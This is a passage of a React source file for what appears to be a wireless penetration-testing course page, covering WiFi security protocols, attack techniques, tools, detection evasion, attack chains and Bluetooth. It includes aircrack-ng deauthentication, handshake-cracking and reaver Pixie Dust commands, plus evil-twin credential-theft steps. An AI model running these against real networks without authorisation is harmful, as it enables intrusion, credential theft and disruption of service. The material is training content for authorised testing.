                  <TableCell>{row.frequency}</TableCell>
                  <TableCell>{row.maxSpeed}</TableCell>
                  <TableCell>{row.year}</TableCell>
                  <TableCell>
                    <Chip 
                      label={row.status} 
                      size="small" 
                      color={row.status === "Current" ? "success" : row.status === "Common" ? "primary" : "default"} 
                    />
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Key Concepts for Beginners</Typography>
        <Grid container spacing={2}>
          {[
            { term: "SSID", definition: "Network name - what you see when searching for WiFi" },
            { term: "BSSID", definition: "MAC address of the access point (unique identifier)" },
            { term: "Channel", definition: "Frequency slice the network operates on (1-14 for 2.4GHz)" },
            { term: "Beacon Frame", definition: "Broadcast announcing network presence" },
            { term: "Handshake", definition: "Authentication exchange between client and AP" },
            { term: "Monitor Mode", definition: "Wireless adapter mode to capture all nearby traffic" },
            { term: "Packet Injection", definition: "Ability to send custom wireless frames" },
            { term: "Deauthentication", definition: "Frame type that disconnects clients from AP" },
          ].map((item) => (
            <Grid item xs={12} sm={6} md={3} key={item.term}>
              <Card variant="outlined" sx={{ height: "100%" }}>
                <CardContent>
                  <Typography variant="subtitle2" color="primary" fontWeight="bold">{item.term}</Typography>
                  <Typography variant="body2">{item.definition}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      </TabPanel>

      {/* Tab 2: WiFi Security Protocols */}
      <TabPanel value={tabValue} index={2}>
        <Typography variant="h5" gutterBottom>WiFi Security Protocols</Typography>
        
        <Alert severity="info" sx={{ mb: 3 }}>
          <AlertTitle>Understanding WiFi Security Evolution</AlertTitle>
          WiFi security has evolved significantly since 1997. Understanding each protocol's weaknesses 
          helps you identify vulnerable networks and select appropriate attack techniques. The key 
          takeaway: <strong>WEP is broken</strong>, <strong>WPA/WPA2-Personal depends on password strength</strong>, 
          and <strong>WPA2/WPA3-Enterprise is the gold standard</strong>.
        </Alert>

        <Typography variant="h6" gutterBottom>Protocol Comparison</Typography>
        <TableContainer component={Paper} sx={{ mb: 3 }}>
          <Table>
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Protocol</strong></TableCell>
                <TableCell><strong>Year</strong></TableCell>
                <TableCell><strong>Key Length</strong></TableCell>
                <TableCell><strong>Security</strong></TableCell>
                <TableCell><strong>Crack Time</strong></TableCell>
                <TableCell><strong>Description</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {securityProtocols.map((row) => (
                <TableRow key={row.protocol}>
                  <TableCell><Chip label={row.protocol} size="small" variant="outlined" /></TableCell>
                  <TableCell>{row.year}</TableCell>
                  <TableCell><Typography variant="body2">{row.keyLength}</Typography></TableCell>
                  <TableCell>
                    <Chip 
                      label={row.security} 
                      size="small" 
                      color={
                        row.security === "Broken" ? "error" : 
                        row.security === "Weak" ? "warning" :
                        row.security === "Moderate" ? "info" : "success"
                      } 
                    />
                  </TableCell>
                  <TableCell><Typography variant="body2" color="text.secondary">{row.crackTime}</Typography></TableCell>
                  <TableCell>{row.description}</TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Typography variant="h6" gutterBottom>Protocol Deep Dives</Typography>
        
        {protocolDetails.map((protocol) => (
          <Accordion key={protocol.name}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1, width: "100%" }}>
                <LockIcon color={protocol.status as "error" | "warning" | "info" | "success"} />
                <Typography fontWeight="bold">{protocol.name}</Typography>
                <Chip label={protocol.year} size="small" sx={{ ml: "auto", mr: 2 }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography paragraph>{protocol.summary}</Typography>
              
              <Typography variant="subtitle2" color="error" gutterBottom>Vulnerabilities:</Typography>
              <List dense>
                {protocol.vulnerabilities.map((vuln, idx) => (
                  <ListItem key={idx}>
                    <ListItemIcon><ErrorIcon color="error" fontSize="small" /></ListItemIcon>
                    <ListItemText primary={vuln} />
                  </ListItem>
                ))}
              </List>

              <Typography variant="subtitle2" color="primary" gutterBottom sx={{ mt: 2 }}>Attack Techniques:</Typography>
              <Grid container spacing={1} sx={{ mb: 2 }}>
                {protocol.attacks.map((attack) => (
                  <Grid item xs={12} sm={6} key={attack.name}>
                    <Card variant="outlined" sx={{ p: 1 }}>
                      <Typography variant="subtitle2" fontWeight="bold">{attack.name}</Typography>
                      <Typography variant="body2" color="text.secondary">{attack.desc}</Typography>
                    </Card>
                  </Grid>
                ))}
              </Grid>

              <Typography variant="subtitle2" gutterBottom sx={{ mt: 2 }}>
                <TerminalIcon sx={{ verticalAlign: "middle", mr: 1 }} />
                Example Commands:
              </Typography>
              <CodeBlock title={`${protocol.name} Attack Commands`}>{protocol.commands}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Quick Reference: Which Attack for Which Protocol?</Typography>
        <TableContainer component={Paper}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Scenario</strong></TableCell>
                <TableCell><strong>Attack</strong></TableCell>
                <TableCell><strong>Time Required</strong></TableCell>
                <TableCell><strong>Success Rate</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {[
                { scenario: "WEP Network", attack: "IV Attack (aircrack-ng)", time: "5-30 minutes", success: "100%" },
                { scenario: "WPA/WPA2 + Weak Password", attack: "Handshake + Dictionary", time: "Minutes to hours", success: "Depends on wordlist" },
                { scenario: "WPA/WPA2 + Strong Password", attack: "PMKID + GPU Cracking", time: "Days to never", success: "Low" },
                { scenario: "WPS Enabled", attack: "Pixie Dust", time: "Seconds", success: "~30% of routers" },
                { scenario: "WPS Enabled (no Pixie)", attack: "PIN Bruteforce", time: "4-10 hours", success: "High if no lockout" },
                { scenario: "WPA2-Enterprise", attack: "Evil Twin + hostapd-wpe", time: "Minutes (if user connects)", success: "Depends on user training" },
                { scenario: "WPA3-Personal", attack: "Dragonblood (if vulnerable)", time: "Hours", success: "Only specific implementations" },
              ].map((row, idx) => (
                <TableRow key={idx}>
                  <TableCell>{row.scenario}</TableCell>
                  <TableCell><Chip label={row.attack} size="small" variant="outlined" /></TableCell>
                  <TableCell>{row.time}</TableCell>
                  <TableCell>{row.success}</TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Divider sx={{ my: 4 }} />

        <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <ScienceIcon color="secondary" />
          Protocol Packet Structures (Visual Deep Dive)
        </Typography>
        <Typography paragraph color="text.secondary">
          Understanding the actual structure of WiFi frames helps you understand why certain attacks work.
          These diagrams show what's happening at the protocol level.
        </Typography>

        {Object.entries(protocolPacketStructures).map(([key, structure]) => (
          <Accordion key={key} sx={{ mb: 1 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                <Avatar sx={{ bgcolor: "secondary.main", width: 36, height: 36 }}>
                  <LockIcon fontSize="small" />
                </Avatar>
                <Box>
                  <Typography fontWeight="bold">{structure.title}</Typography>
                  <Typography variant="body2" color="text.secondary">{structure.description}</Typography>
                </Box>
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Paper sx={{ p: 2, bgcolor: "grey.900", overflow: "auto" }}>
                <Typography
                  component="pre"
                  sx={{
                    fontFamily: "monospace",
                    fontSize: "0.7rem",
                    lineHeight: 1.3,
                    color: "success.light",
                    whiteSpace: "pre",
                    m: 0,
                  }}
                >
                  {structure.diagram}
                </Typography>
              </Paper>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 4 }} />

        <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <TimelineIcon color="primary" />
          Attack Timelines (Step-by-Step Guides)
        </Typography>
        <Typography paragraph color="text.secondary">
          Follow these timelines to understand the complete flow of each attack type, from setup to completion.
        </Typography>

        {attackTimelines.map((timeline, idx) => (
          <Accordion key={idx} sx={{ mb: 1 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                <Avatar sx={{ bgcolor: "primary.main", width: 36, height: 36 }}>
                  {idx + 1}
                </Avatar>
                <Box sx={{ flexGrow: 1 }}>
                  <Typography fontWeight="bold">{timeline.name}</Typography>
                  <Typography variant="body2" color="text.secondary">{timeline.description}</Typography>
                </Box>
                <Chip label={timeline.totalTime} size="small" color="info" sx={{ mr: 2 }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <TableContainer component={Paper} variant="outlined">
                <Table size="small">
                  <TableHead>
                    <TableRow sx={{ bgcolor: "action.hover" }}>
                      <TableCell width={80}><strong>Time</strong></TableCell>
                      <TableCell width={180}><strong>Action</strong></TableCell>
                      <TableCell><strong>Command</strong></TableCell>
                      <TableCell width={200}><strong>Notes</strong></TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {timeline.steps.map((step, sidx) => (
                      <TableRow key={sidx}>
                        <TableCell>
                          <Chip label={step.time} size="small" variant="outlined" />
                        </TableCell>
                        <TableCell>
                          <Typography variant="body2" fontWeight="bold">{step.action}</Typography>
                        </TableCell>
                        <TableCell>
                          {step.command !== "(wait)" && step.command !== "(interactive)" && step.command !== "(automatic)" && step.command !== "(check output)" ? (
                            <Typography
                              variant="body2"
                              sx={{
                                fontFamily: "monospace",
                                fontSize: "0.75rem",
                                bgcolor: "grey.900",
                                p: 0.5,
                                borderRadius: 1,
                                color: "success.light",
                              }}
                            >
                              {step.command}
                            </Typography>
                          ) : (
                            <Typography variant="body2" color="text.secondary" fontStyle="italic">
                              {step.command}
                            </Typography>
                          )}
                        </TableCell>
                        <TableCell>
                          <Typography variant="body2" color="text.secondary">{step.notes}</Typography>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </AccordionDetails>
          </Accordion>
        ))}
      </TabPanel>

      {/* Tab 3: Attack Types */}
      <TabPanel value={tabValue} index={3}>
        <Typography variant="h5" gutterBottom>Wireless Attack Types</Typography>
        
        <Alert severity="info" sx={{ mb: 3 }}>
          <AlertTitle>Attack Categories</AlertTitle>
          Wireless attacks can be categorized by their objective: <strong>reconnaissance</strong> (discovering targets), 
          <strong>access</strong> (cracking keys), <strong>interception</strong> (MITM), or <strong>disruption</strong> (DoS). 
          Most real-world assessments combine multiple attack types in sequence.
        </Alert>

        {attackTypes.map((category) => (
          <Accordion key={category.category} defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                {category.icon}
                <Typography variant="h6">{category.category}</Typography>
                <Chip label={`${category.attacks.length} attacks`} size="small" sx={{ ml: 2 }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography paragraph color="text.secondary">{category.description}</Typography>
              <TableContainer component={Paper} variant="outlined">
                <Table size="small">
                  <TableHead>
                    <TableRow sx={{ bgcolor: "action.hover" }}>
                      <TableCell><strong>Attack</strong></TableCell>
                      <TableCell><strong>Description</strong></TableCell>
                      <TableCell><strong>Difficulty</strong></TableCell>
                      <TableCell><strong>Detectability</strong></TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {category.attacks.map((attack) => (
                      <TableRow key={attack.name}>
                        <TableCell>
                          <Typography variant="subtitle2" fontWeight="bold" color="primary">
                            {attack.name}
                          </Typography>
                        </TableCell>
                        <TableCell>
                          <Typography variant="body2">{attack.description}</Typography>
                        </TableCell>
                        <TableCell>
                          <Chip 
                            label={attack.difficulty} 
                            size="small" 
                            color={attack.difficulty === "Easy" ? "success" : attack.difficulty === "Medium" ? "warning" : "error"}
                          />
                        </TableCell>
                        <TableCell>
                          <Chip 
                            label={attack.detectability} 
                            size="small" 
                            variant="outlined"
                            color={attack.detectability === "Undetectable" ? "success" : attack.detectability === "Low" || attack.detectability === "Very Low" ? "info" : attack.detectability === "Medium" ? "warning" : "error"}
                          />
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Common Attack Chains</Typography>
        <Grid container spacing={2}>
          {[
            {
              name: "WPA2-PSK Cracking",
              steps: ["1. Passive recon (airodump-ng)", "2. Deauth client", "3. Capture handshake", "4. Crack offline (hashcat)"],
              time: "Minutes to days",
            },
            {
              name: "Evil Twin + Credential Capture",
              steps: ["1. Clone target AP", "2. Deauth legitimate clients", "3. Clients connect to evil twin", "4. Capture credentials via portal"],
              time: "Minutes",
            },
            {
              name: "WPS Exploitation",
              steps: ["1. Scan for WPS (wash)", "2. Try Pixie Dust (-K 1)", "3. If fails, bruteforce PIN", "4. Recover PSK from WPS"],
              time: "Seconds to hours",
            },
            {
              name: "Enterprise Credential Theft",
              steps: ["1. Setup hostapd-wpe", "2. Clone corporate SSID", "3. User connects to rogue AP", "4. Capture and crack MSCHAPv2"],
              time: "Depends on user",
            },
          ].map((chain) => (
            <Grid item xs={12} md={6} key={chain.name}>
              <Card variant="outlined">
                <CardContent>
                  <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                    {chain.name}
                  </Typography>
                  <Stepper orientation="vertical" sx={{ mt: 1 }}>
                    {chain.steps.map((step, idx) => (
                      <Step key={idx} active completed={false}>
                        <StepLabel>{step}</StepLabel>
                      </Step>
                    ))}
                  </Stepper>
                  <Chip label={`Est. time: ${chain.time}`} size="small" sx={{ mt: 2 }} />
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Essential Commands Quick Reference</Typography>
        <CodeBlock title="Aircrack-ng Suite Basics">{`# Enable monitor mode
airmon-ng start wlan0

# Scan all networks
airodump-ng wlan0mon

# Target specific network (channel 6)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauthenticate client
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Deauthenticate all clients on network
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Check for WPS
wash -i wlan0mon

# Pixie Dust attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv`}</CodeBlock>
      </TabPanel>

      {/* Tab 3: Tools */}
      <TabPanel value={tabValue} index={4}>
        <Typography variant="h5" gutterBottom>Wireless Pentesting Tools</Typography>
        
        <Alert severity="info" sx={{ mb: 3 }}>
          <AlertTitle>Critical: Hardware Requirements</AlertTitle>
          <Typography paragraph>
            Most wireless attacks require an adapter that supports <strong>monitor mode</strong> and 
            <strong>packet injection</strong>. Your laptop's built-in WiFi will NOT work for these attacks.
          </Typography>
          <Typography variant="body2">
            <strong>Recommended chipsets:</strong> Atheros AR9271 (2.4GHz only), Ralink RT3070, 
            Realtek RTL8812AU (dual-band), MediaTek MT7612U (best modern option)
          </Typography>
        </Alert>

        {tools.map((category) => (
          <Accordion key={category.category} defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                <Typography variant="h6">{category.category}</Typography>
                <Chip label={`${category.items.length} items`} size="small" sx={{ ml: 1 }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography paragraph color="text.secondary">{category.description}</Typography>
              <Grid container spacing={2}>
                {category.items.map((item) => (
                  <Grid item xs={12} sm={6} md={4} key={item.name}>
                    <Card variant="outlined" sx={{ height: "100%" }}>
                      <CardContent>
                        <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                          <Typography variant="subtitle1" fontWeight="bold">{item.name}</Typography>
                          <Chip 
                            label={item.type} 
                            size="small" 
                            color={item.type === "Hardware" ? "secondary" : "primary"} 
                          />
                        </Box>
                        <Typography variant="body2" color="text.secondary" paragraph>{item.description}</Typography>
                        {(item as { chipset?: string }).chipset && (
                          <Chip label={(item as { chipset?: string }).chipset} size="small" variant="outlined" sx={{ mr: 1 }} />
                        )}
                        {(item as { bands?: string }).bands && (
                          <Chip label={(item as { bands?: string }).bands} size="small" variant="outlined" sx={{ mr: 1 }} />
                        )}
                        {(item as { platform?: string }).platform && (
                          <Chip label={(item as { platform?: string }).platform} size="small" variant="outlined" />
                        )}
                        {(item as { usage?: string }).usage && (
                          <Typography variant="caption" component="div" sx={{ mt: 1, fontFamily: "monospace", color: "text.secondary" }}>
                            {(item as { usage?: string }).usage}
                          </Typography>
                        )}
                      </CardContent>
                    </Card>
                  </Grid>
                ))}
              </Grid>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Setting Up Your Wireless Lab</Typography>
        <Grid container spacing={2}>
          <Grid item xs={12} md={6}>
            <Card variant="outlined">
              <CardContent>
                <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                  <ComputerIcon sx={{ verticalAlign: "middle", mr: 1 }} />
                  Kali Linux Setup
                </Typography>
                <CodeBlock title="Driver Installation">{`# Update system
sudo apt update && sudo apt upgrade

# Install aircrack-ng suite
sudo apt install aircrack-ng

# Install additional tools
sudo apt install hcxdumptool hcxtools reaver bully

# Install hashcat for GPU cracking
sudo apt install hashcat

# Check adapter is recognized
iwconfig
airmon-ng`}</CodeBlock>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} md={6}>
            <Card variant="outlined">
              <CardContent>
                <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                  <WifiIcon sx={{ verticalAlign: "middle", mr: 1 }} />
                  Adapter Configuration
                </Typography>
                <CodeBlock title="Monitor Mode Setup">{`# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode
iwconfig wlan0mon

# Change channel manually
sudo iwconfig wlan0mon channel 6

# Set TX power (if supported)
sudo iwconfig wlan0mon txpower 30

# Return to managed mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager`}</CodeBlock>
              </CardContent>
            </Card>
          </Grid>
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Wordlists for Password Cracking</Typography>
        <TableContainer component={Paper}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Wordlist</strong></TableCell>
                <TableCell><strong>Size</strong></TableCell>
                <TableCell><strong>Description</strong></TableCell>
                <TableCell><strong>Location</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {[
                { name: "rockyou.txt", size: "14M lines", desc: "Classic leaked passwords, good starting point", location: "/usr/share/wordlists/" },
                { name: "SecLists", size: "Various", desc: "Comprehensive collection of security lists", location: "github.com/danielmiessler/SecLists" },
                { name: "hashesorg2019", size: "12B+ hashes", desc: "Massive collection for hash lookups", location: "hashes.org (defunct, mirrors exist)" },
                { name: "weakpass.com", size: "Various", desc: "Curated wordlists optimized for WiFi", location: "weakpass.com" },
                { name: "Custom + Rules", size: "N/A", desc: "Generate variations with hashcat rules", location: "hashcat -r rules/best64.rule" },
              ].map((wl) => (
                <TableRow key={wl.name}>
                  <TableCell><Chip label={wl.name} size="small" variant="outlined" /></TableCell>
                  <TableCell>{wl.size}</TableCell>
                  <TableCell>{wl.desc}</TableCell>
                  <TableCell><Typography variant="caption" fontFamily="monospace">{wl.location}</Typography></TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Divider sx={{ my: 4 }} />

        {/* Tool Mastery Guides Section */}
        <Typography variant="h5" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1, mt: 4 }}>
          <EmojiObjectsIcon color="warning" />
          Tool Mastery Guides
        </Typography>
        <Typography paragraph color="text.secondary">
          Deep-dive into each essential tool with component breakdowns, common mistakes to avoid, and pro tips
          from experienced pentesters. Master these tools to dramatically improve your assessment efficiency.
        </Typography>

        {toolMasteryGuides.map((guide, idx) => (
          <Accordion key={idx} sx={{ mb: 2 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                <Avatar sx={{ bgcolor: guide.difficulty === "Beginner" ? "success.main" : guide.difficulty === "Intermediate" ? "warning.main" : "error.main" }}>
                  <BuildIcon />
                </Avatar>
                <Box sx={{ flexGrow: 1 }}>
                  <Typography fontWeight="bold">{guide.tool}</Typography>
                  <Typography variant="body2" color="text.secondary">{guide.category} â€¢ {guide.difficulty}</Typography>
                </Box>
                <Chip 
                  label={guide.difficulty} 
                  size="small" 
                  color={guide.difficulty === "Beginner" || guide.difficulty === "Beginner-Intermediate" ? "success" : guide.difficulty === "Intermediate" || guide.difficulty === "Intermediate-Advanced" ? "warning" : "error"} 
                />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Alert severity="info" sx={{ mb: 2 }}>
                <AlertTitle>Overview</AlertTitle>
                {guide.description}
              </Alert>

              <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                ğŸ“¦ Components & Commands
              </Typography>
              <Grid container spacing={2} sx={{ mb: 3 }}>
                {guide.components.map((comp, cidx) => (
                  <Grid item xs={12} md={6} key={cidx}>
                    <Card variant="outlined" sx={{ height: "100%" }}>
                      <CardContent>
                        <Typography variant="subtitle2" fontWeight="bold" color="secondary">
                          {comp.name}
                        </Typography>
                        <Typography variant="body2" color="text.secondary" paragraph>
                          {comp.purpose}
                        </Typography>
                        <Paper sx={{ p: 1, bgcolor: "grey.900" }}>
                          {comp.examples.map((ex, eidx) => (
                            <Typography key={eidx} variant="caption" component="div" fontFamily="monospace" color="success.light">
                              $ {ex}
                            </Typography>
                          ))}
                        </Paper>
                      </CardContent>
                    </Card>
                  </Grid>
                ))}
              </Grid>

              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle1" fontWeight="bold" color="error" gutterBottom>
                    âŒ Common Mistakes
                  </Typography>
                  <List dense>
                    {guide.commonMistakes.map((mistake, midx) => (
                      <ListItem key={midx}>
                        <ListItemIcon><CancelIcon color="error" fontSize="small" /></ListItemIcon>
                        <ListItemText primary={mistake} primaryTypographyProps={{ variant: "body2" }} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle1" fontWeight="bold" color="success.main" gutterBottom>
                    âœ… Pro Tips
                  </Typography>
                  <List dense>
                    {guide.proTips.map((tip, tidx) => (
                      <ListItem key={tidx}>
                        <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                        <ListItemText primary={tip} primaryTypographyProps={{ variant: "body2" }} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 4 }} />

        {/* Detection Evasion Techniques */}
        <Typography variant="h5" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <VisibilityOffIcon color="secondary" />
          Detection Evasion Techniques
        </Typography>
        <Typography paragraph color="text.secondary">
          Understanding how to evade wireless intrusion detection systems (WIDS) is crucial for realistic
          assessments. These techniques help you test like real attackers while staying within authorized scope.
        </Typography>

        <Alert severity="warning" sx={{ mb: 3 }}>
          <AlertTitle>Use Responsibly</AlertTitle>
          These techniques should only be used during authorized assessments to test defensive capabilities.
          Document all evasion techniques used in your report so clients can improve detection.
        </Alert>

        <TableContainer component={Paper} sx={{ mb: 3 }}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Technique</strong></TableCell>
                <TableCell><strong>Description</strong></TableCell>
                <TableCell><strong>Implementation</strong></TableCell>
                <TableCell><strong>Effectiveness</strong></TableCell>
                <TableCell><strong>Detectability</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {detectionEvasionTechniques.map((tech, idx) => (
                <TableRow key={idx}>
                  <TableCell>
                    <Typography variant="subtitle2" fontWeight="bold" color="secondary">
                      {tech.technique}
                    </Typography>
                  </TableCell>
                  <TableCell>
                    <Typography variant="body2">{tech.description}</Typography>
                  </TableCell>
                  <TableCell>
                    <Typography variant="caption" fontFamily="monospace" sx={{ bgcolor: "grey.900", p: 0.5, borderRadius: 1 }}>
                      {tech.implementation}
                    </Typography>
                  </TableCell>
                  <TableCell>
                    <Chip 
                      label={tech.effectiveness} 
                      size="small" 
                      color={tech.effectiveness === "High" ? "success" : tech.effectiveness === "Medium" ? "warning" : "default"} 
                    />
                  </TableCell>
                  <TableCell>
                    <Chip 
                      label={tech.detectability} 
                      size="small" 
                      variant="outlined"
                      color={tech.detectability === "Very Low" ? "success" : tech.detectability === "Low" ? "info" : "warning"} 
                    />
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Divider sx={{ my: 4 }} />

        {/* Advanced Attack Chains */}
        <Typography variant="h5" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <AccountTreeIcon color="error" />
          Advanced Attack Chains
        </Typography>
        <Typography paragraph color="text.secondary">
          Real-world wireless attacks rarely involve a single technique. These multi-phase attack chains
          demonstrate how professional pentesters combine tools and methods to achieve complex objectives.
        </Typography>

        <Grid container spacing={3}>
          {advancedAttackChains.map((chain, idx) => (
            <Grid item xs={12} key={idx}>
              <Card variant="outlined">
                <CardContent>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 2 }}>
                    <Box>
                      <Typography variant="h6" color="error" fontWeight="bold">
                        {chain.name}
                      </Typography>
                      <Typography variant="body2" color="text.secondary">
                        {chain.scenario}
                      </Typography>
                    </Box>
                    <Box sx={{ display: "flex", gap: 1 }}>
                      <Chip 
                        label={chain.difficulty} 
                        size="small" 
                        color={chain.difficulty === "Intermediate" ? "warning" : "error"} 
                      />
                      <Chip label={`â±ï¸ ${chain.timeEstimate}`} size="small" variant="outlined" />
                    </Box>
                  </Box>

                  <Stepper orientation="vertical" sx={{ mt: 2 }}>
                    {chain.phases.map((phase, pidx) => (
                      <Step key={pidx} active expanded>
                        <StepLabel>
                          <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                            <Typography variant="subtitle1" fontWeight="bold">{phase.phase}</Typography>
                            <Chip label={phase.duration} size="small" variant="outlined" color="info" />
                          </Box>
                        </StepLabel>
                        <StepContent>
                          <Box sx={{ pl: 2 }}>
                            <List dense>
                              {phase.steps.map((step, sidx) => (
                                <ListItem key={sidx} sx={{ py: 0.5 }}>
                                  <ListItemIcon sx={{ minWidth: 32 }}>
                                    <Avatar sx={{ width: 20, height: 20, fontSize: "0.7rem", bgcolor: "primary.main" }}>
                                      {sidx + 1}
                                    </Avatar>
                                  </ListItemIcon>
                                  <ListItemText 
                                    primary={step}
                                    primaryTypographyProps={{ 
                                      variant: "body2", 
                                      fontFamily: step.includes(":") ? "inherit" : "monospace",
                                      fontSize: "0.85rem",
                                    }}
                                  />
                                </ListItem>
                              ))}
                            </List>
                            <Box sx={{ display: "flex", gap: 1, mt: 1, flexWrap: "wrap" }}>
                              <Typography variant="caption" color="text.secondary">Tools:</Typography>
                              {phase.tools.map((tool) => (
                                <Chip key={tool} label={tool} size="small" variant="outlined" color="primary" />
                              ))}
                            </Box>
                          </Box>
                        </StepContent>
                      </Step>
                    ))}
                  </Stepper>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Alert severity="success">
          <AlertTitle>Tool Mastery Path</AlertTitle>
          <Typography variant="body2">
            <strong>Beginner:</strong> Start with aircrack-ng suite basics, then hcxdumptool for modern captures.
            <br />
            <strong>Intermediate:</strong> Master hashcat rules and GPU optimization, learn Wifiphisher for phishing.
            <br />
            <strong>Advanced:</strong> Combine tools into attack chains, understand evasion, target enterprise networks.
          </Typography>
        </Alert>
      </TabPanel>

      {/* Tab 4: Bluetooth & RF */}
      <TabPanel value={tabValue} index={5}>
        <Typography variant="h5" gutterBottom>Bluetooth & Other RF Protocols</Typography>
        
        <Alert severity="info" sx={{ mb: 3 }}>
          <AlertTitle>Beyond WiFi</AlertTitle>
          Wireless pentesting extends beyond 802.11 WiFi to include Bluetooth Classic, Bluetooth Low Energy (BLE), 
          Zigbee, Z-Wave, and other radio frequency protocols. These are increasingly important with the 
          proliferation of IoT devices in homes and enterprises.
        </Alert>

        <Typography variant="h6" gutterBottom>
          <BluetoothIcon sx={{ verticalAlign: "middle", mr: 1 }} />
          Bluetooth Attack Landscape
        </Typography>
        <TableContainer component={Paper} sx={{ mb: 3 }}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Attack</strong></TableCell>
                <TableCell><strong>Description</strong></TableCell>
                <TableCell><strong>Severity</strong></TableCell>
                <TableCell><strong>Year</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {bluetoothAttacks.map((attack) => (
                <TableRow key={attack.name}>
                  <TableCell>
                    <Typography variant="subtitle2" fontWeight="bold" color="primary">{attack.name}</Typography>
                  </TableCell>
                  <TableCell>{attack.description}</TableCell>
                  <TableCell>
                    <Chip 
                      label={attack.severity} 
                      size="small" 
                      color={attack.severity === "Critical" ? "error" : attack.severity === "High" ? "warning" : attack.severity === "Medium" ? "info" : "default"}
                    />
                  </TableCell>
